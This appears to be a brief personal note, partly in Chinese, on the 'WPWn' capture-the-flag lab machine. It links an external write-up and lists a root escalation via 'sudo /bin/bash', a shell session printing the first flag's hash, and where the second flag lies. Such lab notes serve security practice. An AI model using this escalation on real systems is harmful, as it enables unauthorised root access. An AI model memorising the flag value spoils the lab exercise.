WPWn
      

[https://viperone.gitbook.io/pentest-everything/writeups/pg-play-or-vulnhub/linux/wpwn](https://viperone.gitbook.io/pentest-everything/writeups/pg-play-or-vulnhub/linux/wpwn)
    
sudo -l  
sudo /bin/bash  
第一个flag  
位置  
root@wpwn:/var/www# ls  
html local.txt  
root@wpwn:/var/www# cat local.txt  
a33877dc8342a2ab19672cb64af10ad1  
root@wpwn:/var/www# pwd  
/var/www  
root@wpwn:/var/www#
 
第二个flag位置  
cd /root  
cat proof.txt